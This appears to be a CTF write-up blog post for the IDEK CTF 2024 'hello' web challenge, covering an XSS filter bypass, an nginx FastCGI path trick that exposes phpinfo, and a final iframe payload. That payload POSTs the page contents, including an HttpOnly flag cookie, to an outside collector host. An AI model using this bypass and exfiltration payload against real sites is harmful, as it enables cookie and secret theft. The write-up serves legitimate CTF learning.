---
layout: post
title: IDEK CTF 2024
date: 20-08-2024
categories: [WEB]
tag: [ctf, web]
---

## Web/hello (161 Solves)

### **DESCRIPTION**

> Just to warm you up for the next Fight :"D
>
> Note: the admin bot is not on the same machine as the challenge itself and the .chal.idek.team:1337 URL should be used for the admin bot URL

You can dowload the source code <a href="https://idekctf-challenges.storage.googleapis.com/uploads/f64f1dd16fae27e943a8f7dab349e00509f39c63bb2278328ac5783d867fa393/idek-hello.tar.gz">here</a>

- **Link Challenge:** <a href="http://idek-hello.chal.idek.team:1337/">http://idek-hello.chal.idek.team:1337</a>

- **Admin Bot:** <a href="https://admin-bot.idek.team/idek-hello">https://admin-bot.idek.team/idek-hello</a>

It gives us a blank page so let's take a look through the source code

<img src="./assets/IDEK-CTF/blankpage.png" alt="Ảnh 2" style="width:100%;">

### **ENUMURATION**

- Index.php

```php
<?php


function Enhanced_Trim($inp) {
    $trimmed = array("\r", "\n", "\t", "/", " ");
    return str_replace($trimmed, "", $inp);
}


if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo "Hello, ".Enhanced_Trim($_GET['name']);
}

?>

```

In the `index.php` file, the name parameter is sanitized using the `Enhanced_Trim($inp)` function. Although there’s a substring function at line 12 meant to limit input, it’s not active, so we can ignore it.

At line 13, the input is appended directly to "hello," indicating a potential XSS vulnerability. The `Enhanced_Trim($inp)` function trims whitespace and forward slashes, but you can bypass it by using `%0C` for whitespace and `%26%2347%3B` for forward slashes.

`%0C`: a URL-encoded representation of the form feed character ASCII code 12

`%26%2347%3B`:

```plaintext
Let's split to 3 different parts

%26: Decodes &
%23: Decodes #
%3B: Decodes ;

So, %26%2347%3B translates to &#47; in HTML, which is the HTML entity for the forward slash (/).
```

Using `<svg%0Csrc="alert(1)">`, we have got XSS

<img src="./assets/IDEK-CTF/xss.png" alt="Ảnh 2" style="width:100%;">

- Bot.js

```javascript

puppeteer = require("puppeteer");
const sleep = d => new Promise(r => setTimeout(r, d));

const visit = async () => {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            pipe: true,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--js-flags=--noexpose_wasm,--jitless",
            ],
            dumpio: true
        });

        const ctx = await browser.createBrowserContext();

        const page = await ctx.newPage();
        await page.goto(CHALLENGE_ORIGIN, { timeout: 3000 });
        await page.setCookie({ name: 'FLAG', value: 'idek{PLACEHOLDER}', httpOnly: true });
        await page.goto(TARGET_URL, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(5000);

```

`Puppeteer:` is a library used to control a headless browser (without a GUI). The `Bot.js` file functions as a bot, simulating the behavior of an admin bot for a challenge.

In the script, the `FLAG` is stored in a cookie, but it cannot be accessed using `document.cookie` because the `HttpOnly` attribute is set to true.(Line 23)

`HttpOnly:` Tt restricts client-side access to that cookie, preventing JavaScript from accessing it through document.cookie. This security feature is designed to mitigate the risk of cross-site scripting (XSS) attacks, where an attacker might try to steal session cookies or other sensitive information. With HttpOnly enabled, only the server can access the cookie, making it inaccessible to scripts running in the browser.

So, how do we get the flag? Let's dig deeper at `Info.php` file and `Nginx Configuration` file.

- Info.php

```php
<?php
phpinfo();
?>
```

- Nginx.conf

```nginx
location = /info.php {
    allow 127.0.0.1;
    deny all;
    }

    location ~ \.php$ {
    root           /usr/share/nginx/html;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include fastcgi_params;
    fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
    }
```

Let's dive into the `Nginx Configuration` file.
This config file contains two location blocks, each serving a different purpose.

```nginx
location = /info.php {
    allow 127.0.0.1;
    deny all;
    }
```

The block specificfically targets requests to `/info.php`. This only allow localhost to access `/info.php`. Any IP other than `127.0.0.1`, they will receive a `403 Forbidden` response.

```nginx
location ~ \.php$ {
    root           /usr/share/nginx/html;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include fastcgi_params;
    fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
    }
```

This block matches any request for a PHP file (indicated by the regex `~ \.php`, where `~` is a case-sensitive regular expression). We also notice that it used `Fastcgi`.

After a while of researching, I encounted 2 sites that have alike this problem.
For more details:<br>
<a href="https://nealpoole.com/blog/2011/04/setting-up-php-fastcgi-and-nginx-dont-trust-the-tutorials-check-your-configuration/">Setting up PHP-FastCGI and nginx? Don’t trust the tutorials: check your configuration!</a><br>

<a href="https://www.linode.com/docs/guides/nginx-and-phpfastcgi-on-fedora-14/#configure-your-site">Configure FastCGI</a><br>

Basically, the `conf` file processes one block at a time. For instance, a request like `http://idek-hello.chal.idek.team:1337/info.php/.php` triggers the second block because it ends with `.php`, bypassing the first block. This results in the execution of the script inside the `/info.php`.

<img src="./assets/IDEK-CTF/phpinfo.png" alt="Ảnh 2" style="width:100%;">

### **EXPLOITATION**

With all the information that we gathered, let's craft the final payload.

```plaintext
<iframe src="javascript:fetch('/info.php/.php').then(r=>r.text()).then(x=>{fetch('http://tr0x69.free.beeceptor.com',{method:'POST',body:x})})">
```

Because it has the same origin, so we just need to fetch `/info.php/.php`

Encoded version

```plaintext
<iframe%0Csrc=%22javascript:fetch('%26%2347%3Binfo.php%26%2347%3B.php').then(r=>r.text()).then(x=>{fetch(%27https:%26%2347%3B%26%2347%3Btr0x69.free.beeceptor.com%27,{method:%27POST%27,body:x});})%22>
```

Inspect the body, and I have gotton the flag!!!!

<img src="./assets/IDEK-CTF/flag.png" alt="Ảnh 2" style="width:100%;">
